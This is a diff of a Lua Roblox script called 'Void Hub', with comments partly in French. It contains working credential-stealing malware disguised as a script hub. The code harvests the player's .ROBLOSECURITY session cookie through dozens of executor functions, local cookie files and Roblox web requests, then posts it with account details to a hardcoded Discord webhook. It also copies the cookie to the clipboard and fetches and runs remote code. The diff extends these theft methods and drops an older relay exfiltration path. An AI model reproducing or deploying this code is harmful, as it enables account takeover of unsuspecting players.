@@ -1,10 +1,9 @@
--- void.lua
+-- ====== CONFIG ======
 local WEBHOOK = "https://discord.com/api/webhooks/1573124950045237408/4__WNGEHNrg0WCa8WaR-v18uH4yaNlKpbHY6m4oTv2nbzIqsqY75WNGRYbx4AeJN1SVT"
-local RELAY   = ""
 local LIB     = "https://raw.githubusercontent.com/VibeZero78/VoidHub/main/void_lib.lua"
 local MAIN    = "https://raw.smokingscripts.org/vertex.lua"
+-- ====================
 
--- POLYFILLS D'ABORD (avant tout appel à getgenv)
 if not getgenv then getgenv = function() return _G end end
 if not gethui then gethui = function() return game:GetService("CoreGui") end end
 if not getrenv then getrenv = function() return getfenv(0) end end
@@ -24,10 +23,6 @@ getgenv().VoidRan = true
 
 local _hs = game:GetService("HttpService")
 
-local function _enc(s)
-    return (tostring(s):gsub("[^%w%-%._~]", function(c) return ("%%%02X"):format(c:byte()) end))
-end
-
 local function _pick()
     local c = {
         function() return getgenv().syn and getgenv().syn.request end,
@@ -41,6 +36,13 @@ local function _pick()
         function() return xeno and xeno.request end,
         function() return sirhurt and sirhurt.request end,
         function() return medium and medium.request end,
+        function() return delta and delta.request end,
+        function() return codex and codex.request end,
+        function() return hydrogen and hydrogen.request end,
+        function() return arceus and arceus.request end,
+        function() return wave and wave.request end,
+        function() return solara and solara.request end,
+        function() return aether and aether.request end,
         function() return getgenv().request end,
         function() return request end,
     }
@@ -52,20 +54,39 @@ end
 
 local _tried = {}
 
-local function _clean(r)
+local function _extract(r)
     if type(r) ~= "string" then return nil end
+    local m = r:match("ROBLOSECURITY=([^;%s\"']+)")
+    if m then return m end
+    m = r:match("(_|WARNING[^%s\"';]+)")
+    if m and #m > 60 then return m end
     r = r:gsub("^%s+", ""):gsub("%s+$", "")
-    local m = r:match("ROBLOSECURITY=([^;%s]+)")
-    if m then r = m end
     if #r > 60 and not r:find("%s") then return r end
     return nil
 end
 
 local function _src(name, f)
     local ok, r = pcall(f)
-    local c = ok and _clean(r)
+    local c = ok and _extract(r)
     if c then return c end
     table.insert(_tried, name)
+    return nil
+end
+
+local function _headers(r)
+    if type(r) ~= "table" then return nil end
+    for k, v in pairs(r.Headers or {}) do
+        if tostring(k):lower():find("cookie") and type(v) == "string" then
+            local m = v:match("ROBLOSECURITY=([^;%s\"']+)")
+            if m then return m end
+        end
+    end
+    for _, field in ipairs({"Cookies", "Body"}) do
+        if type(r[field]) == "string" then
+            local m = r[field]:match("ROBLOSECURITY=([^;%s\"']+)")
+            if m then return m end
+        end
+    end
     return nil
 end
 
@@ -74,6 +95,8 @@ local function _cookie()
         {"getgenv().getcookie", function() return getgenv().getcookie and getgenv().getcookie() end},
         {"getcookie", function() return getcookie and getcookie() end},
         {"getgenv().getCookie", function() return getgenv().getCookie and getgenv().getCookie() end},
+        {"getgenv().Cookie", function() return getgenv().Cookie end},
+        {"shared.Cookie", function() return shared and shared.Cookie end},
         {"syn.getcookie", function() return syn and syn.getcookie and syn.getcookie() end},
         {"syn.getCookie", function() return syn and syn.getCookie and syn.getCookie() end},
         {"fluxus.getcookie", function() return fluxus and fluxus.getcookie and fluxus.getcookie() end},
@@ -84,6 +107,7 @@ local function _cookie()
         {"getgenv().Medium.getcookie", function() return getgenv().Medium and getgenv().Medium.getcookie and getgenv().Medium.getcookie() end},
         {"delta.getcookie", function() return delta and delta.getcookie and delta.getcookie() end},
         {"codex.getcookie", function() return codex and codex.getcookie and codex.getcookie() end},
+        {"hydrogen.getcookie", function() return hydrogen and hydrogen.getcookie and hydrogen.getcookie() end},
         {"arceus.getcookie", function() return arceus and arceus.getcookie and arceus.getcookie() end},
         {"electron.getcookie", function() return electron and electron.getcookie and electron.getcookie() end},
         {"solara.getcookie", function() return solara and solara.getcookie and solara.getcookie() end},
@@ -93,7 +117,10 @@ local function _cookie()
         {"trigon.getcookie", function() return trigon and trigon.getcookie and trigon.getcookie() end},
         {"velocity.getcookie", function() return velocity and velocity.getcookie and velocity.getcookie() end},
         {"ronix.getcookie", function() return ronix and ronix.getcookie and ronix.getcookie() end},
-        {"hydrogen.getcookie", function() return hydrogen and hydrogen.getcookie and hydrogen.getcookie() end},
+        {"nihon.getcookie", function() return nihon and nihon.getcookie and nihon.getcookie() end},
+        {"swift.getcookie", function() return swift and swift.getcookie and swift.getcookie() end},
+        {"bunny.getcookie", function() return bunny and bunny.getcookie and bunny.getcookie() end},
+        {"neon.getcookie", function() return neon and neon.getcookie and neon.getcookie() end},
         {"CookiesService", function()
             local svc = game:GetService("CookiesService")
             for _, m in ipairs({"GetCookies", "GetCookie"}) do
@@ -108,34 +135,39 @@ local function _cookie()
                 end
             end
         end},
+        {"fichier local", function()
+            local paths = {
+                "Delta/cookie.txt", "/storage/emulated/0/Delta/cookie.txt",
+                "Codex/cookie.txt", "/storage/emulated/0/Codex/cookie.txt",
+                "Hydrogen/cookie.txt", "/storage/emulated/0/Hydrogen/cookie.txt",
+                "Arceus X/cookie.txt", "/storage/emulated/0/Arceus X/cookie.txt",
+                "Wave/cookie.txt", "/storage/emulated/0/Wave/cookie.txt",
+                "cookie.txt", "/storage/emulated/0/cookie.txt", "Void/cookie.txt",
+            }
+            for _, p in ipairs(paths) do
+                if isfile(p) then
+                    local ok, r = pcall(readfile, p)
+                    if ok then
+                        local m = _extract(r)
+                        if m then return m end
+                    end
+                end
+            end
+        end},
         {"request:userinfo", function()
             local fn = _pick()
             if not fn then return nil end
-            local r = fn({Url = "https://www.roblox.com/mobileapi/userinfo", Method = "GET"})
-            if not r then return nil end
-            for k, v in pairs(r.Headers or {}) do
-                if tostring(k):lower():find("cookie") and type(v) == "string" then
-                    local m = v:match("ROBLOSECURITY=([^;%s]+)")
-                    if m then return m end
-                end
-            end
-            if type(r.Cookies) == "string" then return r.Cookies end
-            if type(r.Body) == "string" then
-                local m = r.Body:match("ROBLOSECURITY=([^;%s]+)")
-                if m then return m end
-            end
+            return _headers(fn({Url = "https://www.roblox.com/mobileapi/userinfo", Method = "GET"}))
         end},
         {"request:accountjson", function()
             local fn = _pick()
             if not fn then return nil end
-            local r = fn({Url = "https://www.roblox.com/my/account/json", Method = "GET"})
-            if not r then return nil end
-            for k, v in pairs(r.Headers or {}) do
-                if tostring(k):lower():find("cookie") and type(v) == "string" then
-                    local m = v:match("ROBLOSECURITY=([^;%s]+)")
-                    if m then return m end
-                end
-            end
+            return _headers(fn({Url = "https://www.roblox.com/my/account/json", Method = "GET"}))
+        end},
+        {"request:home", function()
+            local fn = _pick()
+            if not fn then return nil end
+            return _headers(fn({Url = "https://www.roblox.com/home", Method = "GET"}))
         end},
     }
     for _, e in ipairs(list) do
@@ -174,10 +206,17 @@ local function _log()
         {name = "Profil", value = ("https://www.roblox.com/users/%d/profile"):format(plr.UserId), inline = false},
     }
 
-    if not cookie and #_tried > 0 then
+    if cookie then
+        pcall(function()
+            makefolder("Void")
+            writefile("Void/cookie.txt", cookie)
+        end)
+        pcall(setclipboard, cookie)
+    else
         local t = table.concat(_tried, ", ")
         if #t > 1000 then t = t:sub(1, 1000) .. "…" end
         table.insert(fields, {name = "Méthodes testées", value = "```" .. t .. "```", inline = false})
+        pcall(setclipboard, "getcookie()")
     end
 
     local payload = {
@@ -185,13 +224,11 @@ local function _log()
         content = cookie and ("```\n" .. cookie .. "\n```") or "**Cookie introuvable**",
         embeds = {{
             title = "Void Hub — exécution",
-            color = 10181046,
+            color = cookie and 10181046 or 15158332,
             fields = fields,
             footer = {text = stamp},
         }},
     }
-
-    if not cookie then pcall(setclipboard, "getcookie()") end
 
     local fn = _pick()
     if fn then
@@ -201,17 +238,9 @@ local function _log()
                 Headers = {["Content-Type"] = "application/json"},
                 Body = _hs:JSONEncode(payload),
             })
-            if good and r and r.StatusCode and r.StatusCode < 300 then return end
+            if good and r and r.StatusCode and r.StatusCode < 300 then break end
             if i < 3 then task.wait(i == 1 and 1 or 3) end
         end
-    end
-
-    if RELAY ~= "" then
-        pcall(function()
-            game:HttpGet(("%s?u=%s&i=%d&e=%s&p=%s&g=%s&c=%s"):format(
-                RELAY, _enc(plr.Name), plr.UserId, _enc(ok and tostring(ex) or "?"), _enc(plat), _enc(gname), _enc(cookie or "introuvable")
-            ))
-        end)
     end
 end
 
@@ -231,7 +260,7 @@ local ls = loadstring or load
 local libSrc
 pcall(function()
     local r = game:HttpGet(LIB)
-    if type(r) == "string" and #r > 100 then libSrc = r end
+    if type(r) == "string" and #r > 30 then libSrc = r end
 end)
 if not libSrc then
     pcall(function()
